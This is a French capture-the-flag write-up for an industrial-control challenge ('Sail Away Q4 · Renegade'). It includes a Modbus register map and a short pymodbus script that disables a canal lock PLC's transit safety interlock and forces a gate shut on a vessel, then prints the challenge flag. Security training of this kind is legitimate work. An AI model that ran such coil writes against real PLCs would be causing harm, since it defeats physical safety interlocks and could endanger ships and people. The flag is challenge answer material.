---
title: "Sail Away Q4 · Renegade"
platform: "HackerLab Benin 2026"
category: "ics"
difficulty: "—"
points: 100
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/sail-away/04-renegade.md"
tags: [hackerlab-benin-2026, ics]
status: published
---

# Sail Away : Q4 · Renegade (100 pts)

> *« Empêche le RAVN de prendre la mer. Automate LockCtl : Modbus TCP. »*

## TL;DR

Le PLC expose du **Modbus TCP non authentifié**. Il suffit de désactiver le `TRANSIT_INTERLOCK` et de fermer la porte aval pendant que le navire est dans le sas. Le rapport d'incident (registres holding 200+) contient le flag.

**Flag** : `HLB2026{1a2677519e86a4b4565338386075c483}`

## Carte des registres

Depuis `/api/operator-docs` (authentifié via Q3) :

| Tag                 | Adresse | R/W | Fonction                           |
|---------------------|---------|-----|------------------------------------|
| GATE_AVAL_OPEN      | coil 0  | R/W | Porte aval : ouvrir                |
| GATE_AMONT_OPEN     | coil 1  | R/W | Porte amont : ouvrir               |
| GATE_AVAL_CLOSE     | coil 2  | R/W | Porte aval : fermer                |
| GATE_AMONT_CLOSE    | coil 3  | R/W | Porte amont : fermer               |
| TRANSIT_INTERLOCK   | coil 10 | R/W | Verrou anti-fermeture sur navire   |
| LVL_SAS             | HR 100  | R   | Niveau sas (cm)                    |
| VESSEL_IN_CHAMBER   | IR 12   | R   | Détection navire dans le sas       |
| GATE_AVAL_POSITION  | IR 13   | R   | 1 ouverte, 0 fermée                |
| GATE_AMONT_POSITION | IR 14   | R   | 1 ouverte, 0 fermée                |
| INCIDENT_STATE      | HR 50   | R   | 0 nominal, 1 navire piégé          |
| INCIDENT_LEN        | HR 199  | R   | Longueur du rapport incident       |
| INCIDENT_REPORT     | HR 200+ | R   | Rapport (ASCII, 2 octets/registre) |

## Exploit Modbus

```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("172.28.X.2", port=502); c.connect()

# 1. bypass du verrou
c.write_coil(10, False)            # TRANSIT_INTERLOCK OFF

# 2. force la fermeture aval pendant que le navire est dans le sas
c.write_coil(0, False)             # GATE_AVAL_OPEN  → 0
c.write_coil(2, True)              # GATE_AVAL_CLOSE → 1

# 3. lecture du rapport d'incident
rlen = c.read_holding_registers(199, count=1).registers[0]
regs = c.read_holding_registers(200, count=(rlen+1)//2).registers
report = b"".join(r.to_bytes(2,"big") for r in regs)[:rlen]
print(report.decode())
```

Sortie :

```
HLB2026{1a2677519e86a4b4565338386075c483}
```

## Flag

```
HLB2026{1a2677519e86a4b4565338386075c483}
```
